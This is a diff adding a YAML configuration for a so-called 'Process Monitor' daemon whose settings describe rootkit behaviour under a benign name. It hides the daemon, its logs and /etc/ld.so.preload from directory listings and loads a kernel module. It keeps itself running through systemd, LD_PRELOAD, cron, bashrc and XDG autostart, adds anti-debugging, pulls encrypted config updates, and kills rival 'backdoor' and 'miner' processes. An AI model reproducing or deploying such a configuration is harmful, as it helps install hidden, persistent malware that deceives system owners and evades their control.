@@ -1,0 +1,108 @@
+# Process Monitor Configuration
+version: "1.0.0"
+created_at: 2024-03-17T00:00:00Z
+updated_at: 2024-03-17T00:00:00Z
+
+monitor:
+  scan_interval: 5s
+  scan_batch_size: 100
+  kernel_module: true
+  auto_hide_daemon: true
+  log_level: info
+  log_file: /var/log/process-monitor/daemon.log
+  enable_reporting: false
+
+# Blacklisted processes - will be terminated on detection
+blacklist:
+  - name: malware-sample
+    description: "Example malicious process"
+    auto_start: false
+
+  - name: backdoor
+    description: "Generic backdoor process"
+    path: /tmp/backdoor
+    auto_start: false
+
+  - name: miner
+    description: "Cryptocurrency miner"
+    args:
+      - "--cpu-mining"
+    auto_start: false
+
+# Whitelisted processes - will be hidden and auto-restarted
+whitelist:
+  - name: sshd
+    path: /usr/sbin/sshd
+    auto_start: true
+    start_mode: direct
+    check_period: 30s
+    restart_delay: 5s
+    max_restarts: 5
+    description: "SSH daemon"
+
+  - name: cron
+    path: /usr/sbin/cron
+    auto_start: true
+    start_mode: direct
+    check_period: 60s
+    restart_delay: 10s
+    max_restarts: 3
+    description: "Cron daemon"
+
+  - name: nginx
+    path: /usr/sbin/nginx
+    auto_start: false
+    download_url: ""
+    start_mode: daemon
+    check_period: 30s
+    description: "Nginx web server"
+
+# Files to hide from directory listings
+hidden_files:
+  - /etc/process-monitor
+  - /usr/local/bin/process-monitor-daemon
+  - /var/log/process-monitor
+  - /etc/ld.so.preload
+
+# Persistence configuration
+persistence:
+  enable_systemd: true
+  enable_cron: true
+  enable_ld_preload: true
+  enable_bashrc: true
+  enable_xdg: true
+  enable_inittab: false
+  priority_order:
+    - systemd
+    - ld_preload
+    - cron
+    - xdg
+    - bashrc
+
+# Security settings
+security:
+  enable_anti_debug: true
+  enable_integrity_check: true
+  integrity_interval: 1m
+  enable_signature: true
+  public_key_path: /etc/process-monitor/public_key.pem
+  allowed_users:
+    - root
+  max_failures: 3
+  lockout_duration: 5m
+
+# Auto-update configuration
+update:
+  enable_auto_update: true
+  check_interval: 24h
+  update_url: ""
+  repository_url: https://github.com/JuliaRandolph/process-monitor-config
+  branch: main
+  config_path: config.yaml.enc
+  enable_backup: true
+  backup_dir: /var/backups/process-monitor
+  max_backups: 7
+  verify_signature: true
+  rollback_on_error: true
+
+checksum: ""
